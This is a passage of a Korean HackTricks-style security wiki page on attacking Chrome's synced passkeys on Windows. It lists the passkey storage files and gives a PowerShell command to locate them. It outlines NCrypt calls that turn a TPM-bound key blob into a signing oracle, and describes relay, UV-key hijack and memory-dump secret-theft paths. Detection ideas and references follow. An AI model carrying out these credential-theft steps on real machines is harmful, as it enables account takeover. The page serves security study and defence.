%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`**에는 protobuf로 인코딩된 **`WebauthnCredentialSpecifics`** 레코드가 저장됩니다. 동일 사용자 권한의 프로세스는 동기화된 passkey의 **RP ID**, **username**, **credential ID**, 암호화된 private-key 자료를 열거할 수 있습니다.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**에는 **`wrapped_identity_private_key`**와 동기화된 자격 증명을 복구하는 데 사용되는 래핑된 secret 등 로컬 기기 등록 상태가 저장됩니다.<sup>[[4]](#references)</sup>

빠른 점검:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM에 바인딩된 키 blob도 로컬 서명 오라클로 악용될 수 있음

브라우저가 TPM 기반 ID 키를 **`NCRYPT_OPAQUE_KEY_BLOB`**로 내보내고 해당 blob을 사용자가 접근할 수 있는 상태에 저장하면, malware는 원시 개인 키를 추출할 필요가 없습니다. 같은 머신에서 해당 blob을 다시 가져온 뒤 로컬 TPM에 공격자가 제어하는 데이터의 서명을 요청하면 됩니다:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

이는 **hardware binding이 기기 외부로의 내보내기는 막지만, 침해된 엔드포인트에서 동일 사용자로 사용하는 것은 막지 못한다**는 뜻입니다.

### 실용적인 악용 경로

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome의 LevelDB에서 `WebauthnCredentialSpecifics`를 열거합니다.
   - passkey 로그인을 시작하고 새로운 WebAuthn challenge를 획득합니다.
   - 도난당한 `wrapped_identity_private_key` blob을 피해자의 TPM에서 사용해 cloud-authenticator 요청 바인딩에 서명합니다.
   - 반환된 assertion을 relying party로 릴레이합니다.
   - RP가 `userVerification=preferred`를 허용하거나 **`UV=0`**인 assertion을 거부하지 않을 경우 특히 유용합니다.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state`를 삭제하거나 유효한 서명된 `device/forget` 작업을 전송해 재온보딩을 강제합니다.
   - 온보딩 후 기기가 **`uv_key_pending`** 상태라면 공격자가 제어하는 UV 공개 키를 등록합니다.
   - provider가 새 UV 키의 attestation / secure-hardware origin을 검증하지 않으면, 이후 공격자 키로 생성한 서명이 **`UV=1`**로 취급됩니다.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - Chrome이 동기화된 passkey master secret을 가져오도록 복구 또는 재가입을 강제합니다.
   - `passkey_enclave_state`가 다시 생성되거나 수정되는지 확인한 뒤, 평문 **security domain secret (SDS)**이 메모리에 있는 동안 Chrome 메모리를 덤프합니다.
   - 복구한 SDS를 사용해 모든 `WebauthnCredentialSpecifics` 레코드의 암호화된 필드를 복호화하고, 기기 간 이동이 가능한 WebAuthn private key를 복구합니다.

### DFIR / 탐지 아이디어

- `passkey_enclave_state`의 **삭제/재생성**을 모니터링합니다.<sup>[[4]](#references)</sup>
- 브라우저가 아닌 프로세스의 Chrome **`Sync Data\LevelDB`** 비정상 접근을 경고합니다.
- **Chrome 메모리 덤프** 또는 의심스러운 프로세스 간 메모리 접근을 경고합니다.
- 반복되는 **Google Password Manager recovery PIN** 요청 또는 예상치 못한 재온보딩을 조사합니다.
- WebAuthn **`signCount`**는 동기화된 passkey에서 일정하게 유지될 수 있어 유용하지 않은 경우가 많으므로, 기존 clone 탐지의 효과가 낮다는 점을 유의합니다.

## References

- [1] [Unit 42 – 고가치 분야를 대상으로 수년간 탐지되지 않은 작전을 조사하다](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP를 통한 Word VBA 매크로 phishing → hMailServer 자격 증명 복호화 → Veeam CVE-2023-27532로 SYSTEM 권한 획득](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon 내부: 은밀한 공격 작전의 릴레이 네트워크와 내부 작동 방식 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: passwordless authentication의 새로운 공격 표면](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG 키 저장소](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows 해킹: Microsoft 시스템과 네트워크 공격](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory 데이터 저장소의 실제 작동 방식: NTDS.dit 내부 (1부)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - 원격 Lsass 덤프로 비밀번호 탈취](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho, Still 툴킷으로 사이버 스파이 활동 도구 확장](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW 함수와 `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` 백업 모드](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – 활성 세션 종료](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard와 Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: 자격 증명 보호 및 관리](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
{{#include ../../banners/hacktricks-training.md}}
